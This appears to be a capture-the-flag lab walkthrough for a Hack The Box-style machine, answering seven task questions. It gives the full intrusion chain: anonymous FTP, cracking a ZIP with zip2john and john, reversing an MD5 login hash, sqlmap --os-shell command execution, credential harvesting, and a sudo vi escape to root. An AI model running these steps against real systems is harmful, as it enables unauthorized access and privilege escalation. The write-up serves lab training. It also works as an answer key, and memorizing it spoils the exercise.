Task 1

Besides SSH and HTTP, what other service is hosted on this box?

21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1
80/tcp open  http    Apache httpd 2.4.41

Answer: FTP

Task 2

This service can be configured to allow login with any password for a specific username. What is that username?

Answer: anonymous

Task 3

What is the name of the file downloaded over this service?

ftp anonymous@10.129.64.54

ftp> ls
backup.zip

ftp> get backup.zip

Answer: backup.zip

Task 4

What script from John The Ripper generates a crackable hash from a password protected ZIP archive?

Answer: zip2john

Task 5

What is the password for the admin user on the website?

First, extract the ZIP hash:

zip2john backup.zip > hash.txt

Then crack it:

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

741852963 (backup.zip)

Extract the archive using the recovered password and inspect index.php.

The login uses an MD5 hash:

if($_POST['username'] === 'admin'
&& md5($_POST['password']) ===
"2cb42f8734ea607eefed3b70af13bbd3")

Using an online MD5 decoder reveals:

Answer: qwerty789

Task 6

What option can be passed to sqlmap to try to get command execution via SQL injection?

Answer: --os-shell

After logging into the website, the vulnerable parameter is the search field.

A valid session cookie is required:

sqlmap -u "http://10.129.64.54/dashboard.php?search=test" \
--cookie="PHPSESSID=..." \
--os-shell

This provides an OS shell as the postgres user.

Task 7

What program can the postgres user run as root using sudo?

I upgraded the shell to a fully interactive TTY using:

python3 -c 'import pty; pty.spawn("/bin/bash")'

The shell was unstable, so I searched for database credentials and found them inside /var/www/html/dashboard.php:

password=P@s5w0rd!

I then logged in through SSH as postgres using the recovered password.

Running:

sudo -l

revealed:

(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

Answer: vi

Privilege Escalation

GTFOBins provides a privilege escalation technique for running vi with sudo.

sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf

:set shell=/bin/sh
:shell

This spawns a root shell.

whoami

root
